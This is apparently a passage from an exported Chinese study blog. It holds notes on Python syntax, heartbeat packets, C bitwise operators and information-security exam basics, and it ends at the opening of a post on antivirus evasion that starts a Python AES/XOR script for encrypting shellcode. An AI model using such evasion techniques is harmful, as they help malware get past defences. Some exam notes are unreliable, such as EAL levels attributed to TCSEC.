<h2 id="2-知识点的补充"><a href="#2-知识点的补充" class="headerlink" title="2.知识点的补充"></a>2.知识点的补充</h2><h3 id="2-1pass"><a href="#2-1pass" class="headerlink" title="2.1pass"></a>2.1pass</h3><p>一般python的代码块是基于:和缩进来实现，python中规定代码块中必须有代码才算完整，在没有代码的情况下为了保证语法的完整性可以用pass代替，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h3 id="2-2-is-比较"><a href="#2-2-is-比较" class="headerlink" title="2.2 is 比较"></a>2.2 is 比较</h3><p> is和==的区别是什么？</p>
<p>== ，用于表示两个值是否相等</p>
<p>is，用于表示内存地址是否一致</p>
<p>ex：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1 = &quot;动感&quot;</span><br><span class="line">v2 = &quot;动感&quot;</span><br><span class="line">print(v1 == v2)#True</span><br><span class="line">print(v1 is v2)False</span><br></pre></td></tr></table></figure>

<h3 id="2-3位运算"><a href="#2-3位运算" class="headerlink" title="2.3位运算"></a>2.3位运算</h3><p>因为计算机底层的运算就是二进制的运算，所以这里的位运算就是指对二进制的一个计算，实际上就是数电里面的那些运算规则。</p>
<p>与 或 异或 同或 取反等等</p>
]]></content>
      <categories>
        <category>-python</category>
      </categories>
  </entry>
  <entry>
    <title>今日渗透的知识（心跳包 访问不了的域名）</title>
    <url>/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/</url>
    <content><![CDATA[<h1 id="今日渗透的知识（心跳包-访问不了的域名）"><a href="#今日渗透的知识（心跳包-访问不了的域名）" class="headerlink" title="今日渗透的知识（心跳包 访问不了的域名）"></a>今日渗透的知识（心跳包 访问不了的域名）</h1><h1 id="1-心跳包"><a href="#1-心跳包" class="headerlink" title="1.心跳包"></a>1.心跳包</h1><p>今天在挖洞的时候遇到的问题，有些时候什么都没点就莫名其妙抓了个包，</p>
<p><img src="/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/WPS%E5%9B%BE%E7%89%87%E7%BC%96%E8%BE%91.png" alt="WPS图片编辑"></p>
<p>老师告诉我这是心跳包，然后就去学习了一下</p>
<p><img src="/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/image-20220217170949748.png" alt="image-20220217170949748"></p>
<p><strong>心跳包</strong>就是在<a href="https://baike.baidu.com/item/%E5%AE%A2%E6%88%B7%E7%AB%AF/101081">客户端</a>和<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>间定时通知对方自己状态的一个自己定义的命令字，按照一定的时间间隔发送，类似于<a href="https://baike.baidu.com/item/%E5%BF%83%E8%B7%B3/2640820">心跳</a>，所以叫做心跳包。</p>
<h2 id="1-1-作用"><a href="#1-1-作用" class="headerlink" title="1.1 作用"></a>1.1 作用</h2><p>网络中的接收和发送数据都是使用<a href="https://baike.baidu.com/item/SOCKET/281150">SOCKET</a>进行实现，但是如果此<a href="https://baike.baidu.com/item/%E5%A5%97%E6%8E%A5%E5%AD%97">套接字</a>已经断开，那发送数据和接收数据的时候就一定会有问题。可是如何判断这个套接字是否还可以使用呢？这个就需要在系统中创建心跳机制。其实TCP中已经为我们实现了一个叫做心跳的机制。如果你设置了心跳，那<a href="https://baike.baidu.com/item/TCP/33012">TCP</a>就会在一定的时间（比如你设置的是3秒钟）内发送你设置的次数的心跳（比如说2次），并且此信息不会影响你自己定义的协议。所谓“心跳”就是定时发送一个自定义的结构体（心跳包或心跳帧），让对方知道自己“在线”。 以确保链接的有效性。</p>
<h1 id="2-访问不了的域名"><a href="#2-访问不了的域名" class="headerlink" title="2. 访问不了的域名"></a>2. 访问不了的域名</h1><p><img src="/2022/02/17/%E4%BB%8A%E6%97%A5%E6%B8%97%E9%80%8F%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%88%E5%BF%83%E8%B7%B3%E5%8C%85-%E8%AE%BF%E9%97%AE%E4%B8%8D%E4%BA%86%E7%9A%84%E5%9F%9F%E5%90%8D%EF%BC%89/image-20220217171103673.png" alt="image-20220217171103673"></p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>位运算专题</title>
    <url>/2023/09/23/%E4%BD%8D%E8%BF%90%E7%AE%97%E4%B8%93%E9%A2%98/</url>
    <content><![CDATA[<h1 id="位运算专题"><a href="#位运算专题" class="headerlink" title="位运算专题"></a>位运算专题</h1><p>学一下c语言中的位运算，考试要考，应试用。</p>
<h1 id="符号"><a href="#符号" class="headerlink" title="符号"></a>符号</h1><h2 id="amp-（按位与）"><a href="#amp-（按位与）" class="headerlink" title="&amp;（按位与）"></a>&amp;（按位与）</h2><p>参加运算的两个数据，如果相应的二进制位都为1，则该位结果为1，否则为0.</p>
<p>如下：<code>0&amp;0=0,0&amp;1=0,1&amp;0=0,1&amp;1=1</code></p>
<p><img src="/2023/09/23/%E4%BD%8D%E8%BF%90%E7%AE%97%E4%B8%93%E9%A2%98/image-20230922100827368.png" alt="image-20230922100827368"></p>
<h2 id="按位或"><a href="#按位或" class="headerlink" title="|(按位或)"></a>|(按位或)</h2><p>参加运算的两个数据，如果相应的二进制位都为0，则该位结果为0.否则为1.</p>
<p>如下<code>0|0=0, 0|1=1, 1|0=1, 1|1=1</code></p>
<p><img src="/2023/09/23/%E4%BD%8D%E8%BF%90%E7%AE%97%E4%B8%93%E9%A2%98/image-20230922101039106.png" alt="image-20230922101039106"></p>
<h2 id="按位异或"><a href="#按位异或" class="headerlink" title="^(按位异或)"></a>^(按位异或)</h2><p>按位异或也成为XOR运算符，如果相应的二进制位不同，则该位结果为1，否则为0.</p>
<p>如下<code>0^0=0, 0^1=1, 1^0=1, 1^1=0</code></p>
<p><img src="/2023/09/23/%E4%BD%8D%E8%BF%90%E7%AE%97%E4%B8%93%E9%A2%98/image-20230922101947616.png" alt="image-20230922101947616"></p>
<p>不用中间变量交换变量的方法如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a = <span class="number">3</span>, b = <span class="number">10</span>;</span><br><span class="line">	a = a ^ b;</span><br><span class="line">	b = a ^ b;</span><br><span class="line">	a = a ^ b;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d,%d&quot;</span>, a, b);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/09/23/%E4%BD%8D%E8%BF%90%E7%AE%97%E4%B8%93%E9%A2%98/image-20230922102340251.png" alt="image-20230922102340251"></p>
<h2 id="（按位取反）"><a href="#（按位取反）" class="headerlink" title="~（按位取反）"></a>~（按位取反）</h2><p>此运算符为一个单目运算符，用来对一个二进制数按位取反，例：~11的计算过程如下</p>
<p><img src="/2023/09/23/%E4%BD%8D%E8%BF%90%E7%AE%97%E4%B8%93%E9%A2%98/image-20230923125419810.png" alt="image-20230923125419810"></p>
<h2 id="lt-lt-（左移）"><a href="#lt-lt-（左移）" class="headerlink" title="&lt;&lt;（左移）"></a>&lt;&lt;（左移）</h2><p>用来讲一个数的各位二进制全部左移若干位。</p>
<p>例子:11&lt;&lt;3计算过程如下</p>
<p><img src="/2023/09/23/%E4%BD%8D%E8%BF%90%E7%AE%97%E4%B8%93%E9%A2%98/image-20230923125608117.png" alt="image-20230923125608117"></p>
<p>左移一位相当于乘以2，但只适用于该数左移时被溢出舍弃的高位中不包含1的情况，而且移动后的表达式的值，要与被移动的表达式的符号是一致的。</p>
<h2 id="gt-gt-（右移）"><a href="#gt-gt-（右移）" class="headerlink" title="&gt;&gt;（右移）"></a>&gt;&gt;（右移）</h2><p>a&gt;&gt;2表示将a对各二进制右移2位，移到右端的低位被舍弃，对无符号数，高位补0，原来的符号位补1，左边可能补0也可能补1，具体补什么依赖于机器。</p>
<p><img src="/2023/09/23/%E4%BD%8D%E8%BF%90%E7%AE%97%E4%B8%93%E9%A2%98/image-20230923125959962.png" alt="image-20230923125959962"></p>
<p>值得注意的是，让一个数值或变量左移大于自身长度的位数 或者 使用左移右移移动的位数为负值，在不同的编译器中可能结果不一致，我们应该尽量避免这种情况。</p>
]]></content>
      <categories>
        <category>-c</category>
      </categories>
  </entry>
  <entry>
    <title>信息安全考研基础</title>
    <url>/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="信息安全考研基础"><a href="#信息安全考研基础" class="headerlink" title="信息安全考研基础"></a>信息安全考研基础</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇博客不是技术流的，是针对本人的院校发布的考研大纲提供的信息安全方面的知识大纲所写的基础知识总结。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、信息安全基础</span><br><span class="line">(1)	信息安全基本特征</span><br><span class="line">(2)	信息安全体系结构</span><br><span class="line">(3)	信息安全等级与标准</span><br><span class="line">2、密钥管理</span><br><span class="line">(1) 密钥管理原理</span><br><span class="line">(2) 密钥分配方案</span><br><span class="line">3、PKI</span><br><span class="line">(1)	PKI基本概念和原理</span><br><span class="line">(2)	数字证书概念和原理</span><br><span class="line">4、常见安全设备的基本概念及原理、类型</span><br><span class="line">(1)	防火墙</span><br><span class="line">(2)	入侵检测</span><br><span class="line">(3)	VPN</span><br><span class="line">5、密码学基础</span><br><span class="line">(1)	对称密码算法原理及应用</span><br><span class="line">(2)	非对称密码算法原理及应用</span><br></pre></td></tr></table></figure>

<p>可以看到一共有五个部分啊，我们每个部分的各种知识都放进来，方便看看。同时也是对大纲的一种理解加深。</p>
<h1 id="信息安全基础"><a href="#信息安全基础" class="headerlink" title="信息安全基础"></a>信息安全基础</h1><h2 id="信息安全的基本特征"><a href="#信息安全的基本特征" class="headerlink" title="信息安全的基本特征"></a>信息安全的基本特征</h2><p>保密性(<strong>confidentiality</strong>)：信息加密、解密；信息划分密级，对用户分配不同权限，对不同权限的用户访问的对象进行访问控制；防止硬件辐射泄露、网络截获、窃听等</p>
<p>完整性(<strong>integrity</strong>)：严格控制对系统中数据的写访问。只允许许可的当事人进行更改</p>
<p>可用性(<strong>availability</strong>)：可以保证合法用户在需要时可以访问信息及相关资产。在坚持严格的访问控制机制的条件下，为用户提供方便和快速的访问接口。提供安全性的访问工具。即使在突发事件下，依然能够保障数据和服务的正常使用，例如可防范病毒及各种恶意代码攻击包括<code>DDos</code>攻击，可进行灾难备份</p>
<p><strong>口诀：保完用</strong></p>
<h2 id="网络安全的四层含义"><a href="#网络安全的四层含义" class="headerlink" title="网络安全的四层含义"></a>网络安全的四层含义</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 运行系统安全：系统本身</span><br><span class="line">• 网络上系统信息的安全：系统权限</span><br><span class="line">• 网络上信息传播的安全：防止有害信息传播</span><br><span class="line">• 网络上信息内容的安全：防止利用安全漏洞进行窃听，冒充和诈骗</span><br></pre></td></tr></table></figure>

<h2 id="网络安全结构层次"><a href="#网络安全结构层次" class="headerlink" title="网络安全结构层次"></a>网络安全结构层次</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">物理安全</span><br><span class="line">安全控制</span><br><span class="line">安全服务</span><br></pre></td></tr></table></figure>

<h2 id="网络信息安全策略"><a href="#网络信息安全策略" class="headerlink" title="网络信息安全策略"></a>网络信息安全策略</h2><p>• 物理安全策略：保护计算机系统等硬件设备面手攻击，验证身份和使用权限</p>
<p>• 访问控制策略：网络安全防范和保护的主要策略。保证网络资源不被非法使用和访问<br>入网访问控制<br>网络权限控制<br>目录级安全控制<br>属性安全控制<br>网络服务器安全控制<br>网络检测和锁定控制<br>网络端口和节点的安全控制</p>
<p>• 防火墙控制</p>
<p>• 信息加密策略：保护网上传输的数据</p>
<p>• 网络安全管理策略</p>
<p><strong>口诀：物访防信安</strong></p>
<h2 id="ISO-OSI安全体系3个组成"><a href="#ISO-OSI安全体系3个组成" class="headerlink" title="ISO/OSI安全体系3个组成"></a>ISO/OSI安全体系3个组成</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ISO：国际标准化组织</span><br></pre></td></tr></table></figure>

<p>OSI：开放系统互连通信参考模型<br>安全服务：5类，认证，访问控制，数据保密性，数据完整性，不可否认性<br>安全机制：8类，加密，数字签名，访问控制，数据完整性，鉴别交换，业务填充，路由控制，公证<br>安全管理：3类，系统安全管理，安全服务管理，安全机制管理</p>
<h2 id="网络安全体系2个模型"><a href="#网络安全体系2个模型" class="headerlink" title="网络安全体系2个模型"></a>网络安全体系2个模型</h2><p><code>PDRR：Protection, Detection, Response, Recovery</code><br>保护，检测，响应，恢复</p>
<p><code>PPDR: Policy， Protection, Detection, Response</code><br>安全策略，防护，检测，响应</p>
<h2 id="信息系统安全5个等级"><a href="#信息系统安全5个等级" class="headerlink" title="信息系统安全5个等级"></a>信息系统安全5个等级</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">• 自主保护级</span><br><span class="line">• 系统审计保护级</span><br><span class="line">• 安全标记保护级</span><br><span class="line">• 结构化保护级</span><br><span class="line">• 访问验证保护级</span><br></pre></td></tr></table></figure>

<p><strong>口诀：自系安结访</strong></p>
<h2 id="安全评测认证体系"><a href="#安全评测认证体系" class="headerlink" title="安全评测认证体系"></a>安全评测认证体系</h2><p><code>TCSEC</code>(可信任计算机标准评估准则)：现行的网络安全准则，分为3个部分</p>
<p>• 简介和一般模型<br>• 安全功能要求<br>• 安全保证要求</p>
<p>7种评估保证级：(功结功系半半形)<br>◦ 1:评估保证级别1(<code>EAL1</code>)：功能测试<br>◦ 2:<code>EAL2</code>：结构测试<br>◦ 3：功能测试和校验<br>◦ 4：系统地设计，测试和评审<br>◦ 5：半形式化设计和测试<br>◦ 6：半形式化验证的设计和测试<br>◦ 7：形式化验证的设计和测试</p>
<h1 id="密钥管理"><a href="#密钥管理" class="headerlink" title="密钥管理"></a>密钥管理</h1><h2 id="密码学基础"><a href="#密码学基础" class="headerlink" title="密码学基础"></a>密码学基础</h2><p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008141959237.png" alt="image-20231008141959237"></p>
<p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008142004143.png" alt="image-20231008142004143"></p>
<p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008142009253.png" alt="image-20231008142009253"></p>
<h2 id="密钥类型"><a href="#密钥类型" class="headerlink" title="密钥类型"></a>密钥类型</h2><p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008142036789.png" alt="image-20231008142036789"></p>
<p>会话密钥：保护传输数据（数据加密密钥），保护文件（文件密钥），供通信双方使用（称为专用密钥），使用对称密码算法生成。</p>
<p>密钥加密密钥：对会话密钥或下层密钥进行保护，也称为次主密钥，二级密钥。</p>
<p>主密钥</p>
<p>基本密钥（初始密钥\用户密钥）：用户选定或系统分配，可在较长时间一对用户所专用。</p>
<h2 id="密钥分配"><a href="#密钥分配" class="headerlink" title="密钥分配"></a>密钥分配</h2><p>以下仅考虑在对称密码技术中的密钥分配</p>
<h3 id="集中式密钥分配体质"><a href="#集中式密钥分配体质" class="headerlink" title="集中式密钥分配体质"></a>集中式密钥分配体质</h3><p>需要密钥分配中心(KDC)或密钥转递中心(KTC)<br>典型代表是Kerboros协议</p>
<img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008142841165.png" alt="image-20231008142841165" style="zoom:150%;">

<img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008142852127.png" alt="image-20231008142852127" style="zoom:150%;">

<h3 id="分布式密钥分配体制"><a href="#分布式密钥分配体制" class="headerlink" title="分布式密钥分配体制"></a>分布式密钥分配体制</h3><p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008143246713.png" alt="image-20231008143246713"></p>
<h1 id="PKI技术"><a href="#PKI技术" class="headerlink" title="PKI技术"></a>PKI技术</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>概念：PKI(Public Key Infrastructure)：公钥基础设施，支持<strong>公开密钥管理</strong>并提供<strong>真实性</strong>，<strong>保密性</strong>，<strong>完整性</strong>和<strong>可追究性服务</strong>的基础设施</p>
<p>PKI提供的几种安全服务及对应的技术：向一个实体确认另一个实体是自己。使用<strong>数字签名</strong>实现</p>
<p>• 完整性：向一个实体确保数据没有被修改。使用数字签名和消息认证码(MAC)，MAC使用对称分组密码或密码杂凑函数<br>• 机密性：向一个实体确保除了接收者，无人可读懂数据的关键部分。采用对称密码加密，需要建立密钥交换和密钥传输协议<br>• 不可否认性：使用数字签名实现</p>
<p>应用PKI的几种协议：<br>• IPSec：处在网络层，架设VPN<br>• S/MIME：处在应用层，安全的电子邮件协议<br>• SSL：处在传输层，保证浏览器和服务器之间的加密通信</p>
<h2 id="PKI的基本组成"><a href="#PKI的基本组成" class="headerlink" title="PKI的基本组成"></a>PKI的基本组成</h2><p>完整的PKI系统必须具有权威认证机构(CA)、数字证书库、密钥备份及恢复系统、证书作废系统、应用接口（API）等基本构成部分，构建PKI也将围绕着这五大系统来着手构建。</p>
<p><strong>认证机构</strong>（CA）：即数字证书的申请及签发机关，CA必须具备权威性的特征；</p>
<p><strong>数字证书库</strong>：用于存储已签发的数字证书及公钥，用户可由此获得所需的其他用户的证书及公钥；</p>
<p><strong>密钥备份及恢复系统</strong>：如果用户丢失了用于解密数据的密钥，则数据将无法被解密，这将造成合法数据丢失。为避免这种情况，PKI提供备份与恢复密钥的机制。但须注意，密钥的备份与恢复必须由可信的机构来完成。并且，密钥备份与恢复只能针对解密密钥，签名私钥为确保其唯一性而不能够作备份。</p>
<p><strong>证书作废系统</strong>：证书作废处理系统是PKI的一个必备的组件。与日常生活中的各种身份证件一样,证书有效期以内也可能需要作废，原因可能是密钥介质丢失或用户身份变更等。为实现这一点,PKI必须提供作废证书的一系列机制。</p>
<p><strong>应用接口（API）</strong>：PKI的价值在于使用户能够方便地使用加密、数字签名等安全服务，因此一个完整的PKI必须提供良好的应用接口系统，使得各种各样的应用能够以安全、一致、可信的方式与PKI交互，确保安全网络环境的完整性和易用性。</p>
<p>通常来说，CA是证书的签发机构,它是PKI的核心。众所周知，构建密码服务系统的核心内容是如何实现密钥管理。公钥体制涉及到一对密钥（即私钥和公钥），私钥只由用户独立掌握，无须在网上传输，而公钥则是公开的，需要在网上传送，故公钥体制的密钥管理主要是针对公钥的管理问题，目前较好的解决方案是数字证书机制。</p>
<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>数字证书是公开密钥体系的一种<strong>密钥管理媒介</strong>。<strong>它是一种权威性的电子文档</strong>，形同网络计算环境中的一种身份证，用于证明某一主体（如人、服务器等）的身份以及其公开密钥的合法性，又称为数字ID。数字证书简称证书，它是一个<strong>经证书授权中心CA数字签名的文件</strong>，包含拥有者的公钥及相关身份信息。数字证书技术解决了数字签名技术中无法确定公钥是指定拥有者的问题。</p>
<h3 id="证书结构"><a href="#证书结构" class="headerlink" title="证书结构"></a>证书结构</h3><p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008150155370.png" alt="image-20231008150155370"></p>
<h3 id="证书类型"><a href="#证书类型" class="headerlink" title="证书类型"></a>证书类型</h3><p><strong>自签名证书</strong>：自签名证书又称为根证书，是自己颁发给自己的证书，即证书中的颁发者和主体名相同。<br><strong>CA证书</strong>：CA自身的证书。如果PKI系统中没有多层级CA，CA证书就是自签名证书；如果有多层级CA，则会形成一个CA层次结构，最上层的CA是根CA，它拥有一个CA“自签名”的证书。<br><strong>本地证书</strong>：CA颁发给申请者的证书。<br><strong>设备本地证书</strong>：设备根据CA证书给自己颁发的证书，证书中的颁发者名称是CA服务器的名称。</p>
<h3 id="证书认证过程"><a href="#证书认证过程" class="headerlink" title="证书认证过程"></a>证书认证过程</h3><ol>
<li>证书拆封：使用CA的公钥验证证书的数字签名，验证证书是否为CA所颁发</li>
<li>序列号验证：验证证书的真伪</li>
<li>有效期验证</li>
<li>撤销列表查询</li>
</ol>
<h1 id="常见安全设备的基本概念及原理、类型"><a href="#常见安全设备的基本概念及原理、类型" class="headerlink" title="常见安全设备的基本概念及原理、类型"></a>常见安全设备的基本概念及原理、类型</h1><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>内网：防火墙内的网络<br>外网：防火墙外的网络<br>受信主机和非受信主机分别指内网和外网的主机<br>内网中需要向外提供服务的服务器放在的网段即为非军事化区</p>
<p><strong>NAT</strong><br>工作在传输层<br>作用：解决IP地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机</p>
<h2 id="防火墙的结构"><a href="#防火墙的结构" class="headerlink" title="防火墙的结构"></a>防火墙的结构</h2><h3 id="屏蔽路由器"><a href="#屏蔽路由器" class="headerlink" title="屏蔽路由器"></a>屏蔽路由器</h3><p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008143955460.png" alt="image-20231008143955460"></p>
<h3 id="双宿主防火墙"><a href="#双宿主防火墙" class="headerlink" title="双宿主防火墙"></a>双宿主防火墙</h3><p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008144140749.png" alt="image-20231008144140749"></p>
<h3 id="屏蔽主机防火墙"><a href="#屏蔽主机防火墙" class="headerlink" title="屏蔽主机防火墙"></a>屏蔽主机防火墙</h3><p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008144202131.png" alt="image-20231008144202131"></p>
<h3 id="屏蔽子网防火墙"><a href="#屏蔽子网防火墙" class="headerlink" title="屏蔽子网防火墙"></a>屏蔽子网防火墙</h3><p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008144233974.png" alt="image-20231008144233974"></p>
<h2 id="防火墙类型"><a href="#防火墙类型" class="headerlink" title="防火墙类型"></a>防火墙类型</h2><p>数据包过滤路由器，代理网关(应用层网关)，状态检测<br>包过滤是在网络层拦截所有信息流，代理在应用层实现防火墙的功能<br>代理服务安全性&gt;包过滤，应用层的防火墙性能会有明显下降，故代理服务性能&lt;包过滤</p>
<p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008144622628.png" alt="image-20231008144622628"></p>
<h2 id="入侵检测系统-IDS"><a href="#入侵检测系统-IDS" class="headerlink" title="入侵检测系统(IDS)"></a>入侵检测系统(IDS)</h2><p>基于<strong>误用</strong>(特征)的入侵检测<br>将入侵行为按照某种方式进行特征编码，与模式数据库中的内容进行模式匹配，从而发现入侵行为<br>优点：只需要收集相关的数据集合，减小系统负担<br>缺点：需要不断升级网络入侵和系统误用模式数据库，不能检测未知的入侵方式</p>
<p>基于<strong>异常</strong>的入侵检测<br>对计算机或网络资源进行统计分析，定义一组系统正常情况的阈值，将系统运行时的数值与阈值相比较，判断是否被入侵<br>优点：可检测到未知或更复杂的入侵<br>缺点：误报，漏报率高，不适应用户行为的突然改变</p>
<h2 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h2><p>这个曾经考过了，em。。只能说再考的概率稍微小点，但是还是得背下来。</p>
<p><strong>VPN的概念和特点</strong>：</p>
<p>VPN：虚拟专用网。通过一个公用网络建立一个临时的、安全的连接，是一条穿过混乱的公用网络的安全、稳定的隧道</p>
<p><strong>特点</strong>：<br>• 安全保障：在公用网络上建立一个逻辑的，点对点的连接(建立一个隧道)，并使用加密技术对隧道加密<br>• 服务质量保证：流量预测和流量控制策略，防止阻塞发生<br>• 可扩充性和灵活性：支持通过<code>Intranet</code>和<code>Extranet</code>的任何类型的数据流<br>• 可管理性</p>
<h3 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h3><p>隧道技术是指通过使<strong>用互联网络的基础设施</strong>在网络之间<strong>传递数据</strong>的一种方式<br>被封装的数据包在公共互联网络上传递时所经过的<strong>逻辑路径称为隧道</strong><br>隧道技术包括 <strong>数据封装-传输-解包</strong> 的全过程</p>
<h3 id="不同层的隧道协议"><a href="#不同层的隧道协议" class="headerlink" title="不同层的隧道协议"></a>不同层的隧道协议</h3><p>• 数据链路层：PPTP，L2TP，L2F<br>• 网络层：IPSec<br>• 运输层：SSL<br>• 应用层：set</p>
<h3 id="VPN的4种建立方式"><a href="#VPN的4种建立方式" class="headerlink" title="VPN的4种建立方式"></a>VPN的4种建立方式</h3><p>• Host 对 Host：主机要支持IPSec，VPN网关不需支持<br>• Host 对 VPN网关：均需支持IPSec<br>• VPN 对 VPN网关：主机不需支持IPSec，VPN网关需支持<br>• Remote User 对 VPN网关：均需支持IPSec</p>
<h1 id="密码学基础-1"><a href="#密码学基础-1" class="headerlink" title="密码学基础"></a>密码学基础</h1><h2 id="对称加密算法"><a href="#对称加密算法" class="headerlink" title="对称加密算法"></a>对称加密算法</h2><p>对称加密算法是一种使用同一个密钥进行加密和解密的算法。加密和解密过程使用相同的密钥，因此也被称为“共享密钥加密算法”或“单密钥加密算法”。</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>对称加密算法的原理是通过对数据进行按位异或、替换、置换等运算，将明文转换为密文。在解密时，使用相同的密钥对密文进行逆向运算，将密文恢复为明文。</p>
<p>对称加密算法的工作方式包括<strong>分组密码和流密码两种</strong>。分组密码将明文分成固定长度的数据块进行加密，而流密码将明文和密钥作为输入，逐位产生密文。</p>
<p><img src="/2023/10/08/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E8%80%83%E7%A0%94%E5%9F%BA%E7%A1%80/image-20231008150727026.png" alt="image-20231008150727026"></p>
<h2 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h2><p>加密和解密所用的密钥是不一样的，所以叫“非对称”。<br>非对称加密算法的这两个密钥，一个称为公钥，一个称为私钥。</p>
<p>常见的有：RSA、ECC</p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>免杀学习-python代码分析缝合</title>
    <url>/2022/10/07/%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0-python%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%BC%9D%E5%90%88/</url>
    <content><![CDATA[<h1 id="免杀学习-python代码分析缝合"><a href="#免杀学习-python代码分析缝合" class="headerlink" title="免杀学习-python代码分析缝合"></a>免杀学习-python代码分析缝合</h1><p>分析下市面上的两个个工具，站在巨人的肩膀上</p>
<p>这是一个加密的脚本，可以将对应的数据XOR加密和AES加密，用于加密shellcode（bese64编码后的bin文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_16</span>(<span class="params">s</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="built_in">len</span>(s) % <span class="number">16</span> != <span class="number">0</span>:</span><br><span class="line">            s += <span class="string">&#x27;\0&#x27;</span></span><br><span class="line">        